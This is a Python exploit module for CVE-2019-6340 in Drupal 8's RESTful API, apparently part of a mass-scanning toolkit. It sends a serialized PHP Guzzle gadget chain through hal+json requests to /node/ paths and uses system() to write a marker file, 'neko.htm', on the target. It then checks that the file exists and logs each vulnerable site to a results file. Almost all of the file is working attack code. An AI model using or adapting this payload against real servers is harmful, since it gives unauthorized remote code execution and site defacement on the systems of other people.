# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    flaga = False
    for Node in range(15):
        if Node == 0:
            Node += 1
        headers = {
            'Content-Type': 'application/hal+json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
        }
        try:
            cmd = "echo 'neko!! patch it Now!' > neko.htm"
            Data = r'''{
                "_links": {
                  "type": { "href": "http://%s/rest/type/shortcut/default"}
                },
                "link": [
                  {
                    "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:%d:\"%s\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:%d:\"%s\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}",
                    "value": "link"
                  }
                ]
              }''' % (site, len(cmd), cmd, len('system'), 'system')
            try:
                requests.get('http://{}{}'.format(site, '/node/{}?_format=hal_json'.format(str(Node))),
                             data=Data, headers=headers, timeout=10)
                CheckINDEX = requests.get('http://{}/neko.htm'.format(site), timeout=10, headers=Headers)
                if 'neko!! patch it Now!' in str(CheckINDEX.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/neko.htm' + '\n')
                    flaga = True
                    break
                else:
                    pass
            except:
                pass
        except:
            pass
    if flaga == True:
        return printModule.returnYes(site, 'CVE-2019-6340', 'Drupal 8 RESTful', 'Drupal')
    else:
        return printModule.returnNo(site, 'CVE-2019-6340', 'Drupal 8 RESTful', 'Drupal')
